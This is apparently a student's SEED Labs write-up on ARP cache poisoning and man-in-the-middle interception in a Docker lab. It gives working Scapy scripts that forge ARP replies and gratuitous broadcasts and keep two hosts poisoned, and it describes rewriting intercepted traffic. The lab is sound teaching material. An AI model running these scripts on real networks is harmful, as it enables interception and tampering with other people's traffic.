# ARP Cache Poisoning Attack Lab
**Course:** Network Security — SEED Labs  
**Topic:** ARP Cache Poisoning & Man-in-the-Middle Attack using Scapy

---

## 📋 Table of Contents
- [Lab Overview](#lab-overview)
- [Lab Setup Environment](#lab-setup-environment)
- [Network Topology](#network-topology)
- [Task 1: ARP Cache Poisoning](#task-1-arp-cache-poisoning)
  - [Task 1.A: Using ARP Request](#task-1a-using-arp-request)
  - [Task 1.B: Using ARP Reply](#task-1b-using-arp-reply)
  - [Task 1.C: Using ARP Gratuitous Message](#task-1c-using-arp-gratuitous-message)
- [Task 2: MITM Attack on Telnet](#task-2-mitm-attack-on-telnet)
- [Task 3: MITM Attack — Modifying Data](#task-3-mitm-attack--modifying-data)
- [Key Observations](#key-observations)

---

## Lab Overview

This lab focuses on the **ARP Cache Poisoning Attack**, a critical Layer-2 network attack. Using **Scapy** inside a SEED Lab Docker environment, we explore:

- How ARP cache poisoning works by sending forged ARP packets
- How an attacker (M) can trick Host A into mapping Host B's IP to M's MAC
- How poisoned ARP caches enable **Man-in-the-Middle (MITM)** attacks
- How an attacker can intercept and **modify live Telnet traffic** between two hosts

---

## Lab Setup Environment

### Step 1 — Download the Lab Setup
1. Open the SEED VM and launch **Firefox**
2. Go to: **SEED Labs → Network Security → ARP Cache Poisoning Attack**
3. Download the **labsetup.zip** file

### Step 2 — Prepare the Lab Directory
```bash
# Copy the zip to Documents
# Documents >> arpattack >> labsetup.zip

# Unzip the file
unzip labsetup.zip

# Right-click inside the folder → Open Terminal
```

### Step 3 — Build and Start Docker Containers
```bash
# Navigate to the Labsetup folder
cd ~/ARPattack/Labsetup

# Build the Docker images
dcbuild

# Start the containers
dcup
```

**Expected output after `dcup`:**
```
Creating network "net-10.9.0.0" with the default driver
Creating B-10.9.0.6    ... done
Creating M-10.9.0.105  ... done
Creating A-10.9.0.5    ... done
```

### Step 4 — Connect to Containers
```bash
# List all running containers
dockps

# Output:
# fbe0c5711e1e  M-10.9.0.105
# 2d421838abed  B-10.9.0.6
# 8f1c9b4adc35  A-10.9.0.5

# Connect to the Attacker (M)
docksh fb

# Open separate terminals for Host A and Host B
docksh 8f    # Host A
docksh 2d    # Host B
```

---

## Network Topology

| Host | IP Address | MAC Address |
|------|-----------|-------------|
| Host A (Victim) | 10.9.0.5 | 02:42:0a:09:00:05 |
| Host B (Victim) | 10.9.0.6 | 02:42:0a:09:00:06 |
| Attacker M | 10.9.0.105 | 02:42:0a:09:00:69 |

### Verify LAN Connectivity
```bash
# From Host A, ping Host B
ping 10.9.0.6

# From Host B, ping Host A
ping 10.9.0.5
```
✅ Both pings succeed — confirming the LAN is working correctly.

### Verify Interface and Run tcpdump on M
```bash
# In M's terminal — check interface
ifconfig
# Confirmed interface: eth0, MAC: 02:42:0a:09:00:69

# Run tcpdump to listen on eth0
tcpdump -i eth0 -n
```
Then ping from Host A to Host B — M's tcpdump captures the ICMP traffic.

---

## Task 1: ARP Cache Poisoning

**Goal:** Poison Host A's ARP cache so that it maps Host B's IP (`10.9.0.6`) to Attacker M's MAC (`02:42:0a:09:00:69`).

### Check Initial ARP Caches
```bash
# On Host A — check ARP table
arp -an

# On Host B — check ARP table
arp -an
```

### Enter Scapy on Attacker Machine
```bash
scapy

# View ARP fields
>>> ls(ARP)
>>> ls(Ether)
```

---

### Task 1.A: Using ARP Request

**Create `arp_poision.py` in the Attacker (M) volumes folder:**

```python
#!/usr/bin/env python3
from scapy.all import *

# Craft a forged ARP Request
# Tell Host A that B's IP (10.9.0.6) is at M's MAC
E = Ether()
E.dst = '02:42:0a:09:00:05'        # Host A's MAC (destination)

A = ARP()
A.op  = 1                           # op=1 means ARP Request
A.pdst = '10.9.0.5'                # Target: Host A's IP
A.hwdst = '02:42:0a:09:00:05'      # Target: Host A's MAC
A.psrc = '10.9.0.6'                # Spoof: claim to be Host B's IP
A.hwsrc = '02:42:0a:09:00:69'      # But use Attacker M's MAC

pkt = E / A
sendp(pkt)
print("ARP Request sent!")
```

```bash
# Make executable and run
chmod a+x arp_poision.py
./arp_poision.py
```

**Verify on Host A:**
```bash
arp -n
```

#### ✅ Output / Observation
Host A's ARP cache now shows:
```
Address     HWtype  HWaddress           Flags Mask
10.9.0.6    ether   02:42:0a:09:00:69   C
```
> **Host B's MAC was replaced with Attacker M's MAC** — ARP cache poisoning successful!

---

### Task 1.B: Using ARP Reply

#### Scenario 1: B's IP is Already in A's Cache

**Create `arp_scenario1.py`:**
```python
#!/usr/bin/env python3
from scapy.all import *

E = Ether()
E.dst = '02:42:0a:09:00:05'        # Host A's MAC

A = ARP()
A.op  = 2                           # op=2 means ARP Reply
A.pdst = '10.9.0.5'
A.hwdst = '02:42:0a:09:00:05'
A.psrc = '10.9.0.6'                # Spoof as Host B
A.hwsrc = '02:42:0a:09:00:69'      # Use M's MAC

pkt = E / A
sendp(pkt)
```

```bash
chmod a+x arp_scenario1.py
./arp_scenario1.py
```

#### ✅ Output / Observation
Host A accepted the unsolicited ARP reply and updated its cache:
`10.9.0.6 (B) → 02:42:0a:09:00:69 (M)` — **attack succeeded**.

---

#### Scenario 2: B's IP is NOT in A's Cache

```bash
# On Host A — clear the existing ARP entry for Host B
arp -d 10.9.0.6

# Verify it's cleared
arp -n | grep 10.9.0.6
# Result: No entry found
```

```bash
# Run the same arp_scenario1.py again from M
./arp_scenario1.py
```

```bash
# Check Host A's ARP table
arp -n
```

#### ✅ Output / Observation
When B's IP is **not already** in A's cache, Host A **did not accept** the unsolicited ARP reply — **no poisoned entry was created**.

---

### Task 1.C: Using ARP Gratuitous Message

**Create `arp_grat.py`:**
```python
#!/usr/bin/env python3
from scapy.all import *

E = Ether()
E.dst = 'ff:ff:ff:ff:ff:ff'        # Broadcast to all

A = ARP()
A.op   = 2                          # ARP Reply
A.pdst = '10.9.0.6'                # Target IP = source IP (gratuitous)
A.hwdst = 'ff:ff:ff:ff:ff:ff'
A.psrc = '10.9.0.6'
A.hwsrc = '02:42:0a:09:00:69'      # M's MAC

pkt = E / A
sendp(pkt)
print("Sent unsolicited ARP REPLY to A: 10.9.0.6 is-at 02:42:0a:09:00:69")
```

```bash
chmod a+x arp_grat.py
./arp_grat.py
```

```bash
# Verify on Host A
arp -n
```

#### ✅ Output / Observation
```
Address     HWtype  HWaddress           Flags
10.9.0.6    ether   02:42:0a:09:00:69   C
```
The gratuitous ARP broadcast successfully poisoned Host A's cache — even without a prior entry for Host B.

---

## Task 2: MITM Attack on Telnet

**Goal:** Position Attacker M between Host A and Host B to intercept Telnet traffic.

### Step 1 — Disable IP Forwarding on M (to drop packets initially)
```bash
sysctl net.ipv4.ip_forward=0
```

### Step 2 — Create and Run `arp_mitm.py`
```python
#!/usr/bin/env python3
from scapy.all import *

# Continuously send poisoned ARP replies to both A and B
def poison():
    # Tell A: B's IP is at M's MAC
    pktA = Ether(dst='02:42:0a:09:00:05') / ARP(
        op=2, psrc='10.9.0.6', hwsrc='02:42:0a:09:00:69',
        pdst='10.9.0.5', hwdst='02:42:0a:09:00:05')
    # Tell B: A's IP is at M's MAC
    pktB = Ether(dst='02:42:0a:09:00:06') / ARP(
        op=2, psrc='10.9.0.5', hwsrc='02:42:0a:09:00:69',
        pdst='10.9.0.6', hwdst='02:42:0a:09:00:06')
    sendp([pktA, pktB], verbose=False)

while True:
    poison()
    time.sleep(3)
```

```bash
chmod a+x arp_mitm.py
./arp_mitm.py
```

### Step 3 — Test: Ping Should Fail (ip_forward=0)
```bash
# On Host A
ping 10.9.0.6
# Packets go to M and are DROPPED — ping fails
```

### Step 4 — Enable IP Forwarding (to forward packets)
```bash
sysctl net.ipv4.ip_forward=1
```
Ping from A to B now **succeeds** — M is silently forwarding packets.

### Step 5 — Launch Telnet from Host A
```bash
# On Host A
telnet 10.9.0.6
# Login: seed
```

#### ✅ Output / Observation
- Host A's Telnet session connected to Host B **through Attacker M**
- Wireshark on M confirmed ARP packets being sent continuously
- From Wireshark: ICMP redirect messages visible — `From 10.9.0.105: icmp_seq Redirect Host (New nexthop: 10.9.0.6)`
- **MITM attack successful** — M sits between A and B intercepting all traffic

---

## Task 3: MITM Attack — Modifying Data

**Goal:** Intercept the Telnet stream and **replace typed data** with `AAAAAAAAAA`.

### Create `arp_task3.py` (with packet modification):
```bash
nano arp_task3.py
chmod a+x arp_task3.py
./arp_task3.py
```

The script uses BPF filter:
```
tcp and (ether src 02:42:0a:09:00:05 or ether src 02:42:0a:09:00:06)
or tcp and (src host 10.9.0.5 or dst host 10.9.0.6)
```

### Step — Start Netcat on Host B and Telnet from Host A
```bash
# On Host B
nc -lp 9090

# On Host A
nc 10.9.0.6 9090
```
Type in Host A's terminal: `nagajyothi`

#### ✅ Output / Observation
- Host A typed: `nagajyothi`
- Host B received: `AAAAAAAAAA`

> **Attacker M intercepted the TCP payload and replaced the first name with all A's** — demonstrating full content modification in a MITM attack.
>
> Wireshark confirmed ARP packets continuously being broadcast, keeping both victims' caches poisoned.

---

## Key Observations

| Task | Method | Result |
|------|--------|--------|
| Task 1.A | ARP Request | Successfully poisoned Host A's cache with M's MAC |
| Task 1.B Scenario 1 | ARP Reply (entry exists) | Unsolicited reply accepted — cache poisoned |
| Task 1.B Scenario 2 | ARP Reply (no entry) | Reply rejected — no entry created |
| Task 1.C | Gratuitous ARP | Broadcast poisoned all hosts on the subnet |
| Task 2 | MITM via ARP Poisoning | Telnet session intercepted through Attacker M |
| Task 3 | Data Modification | Live Telnet data replaced with `AAAAAAAAAA` |

> **Security Takeaway:** ARP has no authentication mechanism — any host can send forged ARP replies. Defenses include **Dynamic ARP Inspection (DAI)**, **static ARP entries** for critical hosts, and **encrypted protocols (SSH instead of Telnet)** to prevent data interception even if MITM succeeds.

---

*Lab completed as part of the SEED Labs Network Security curriculum.*
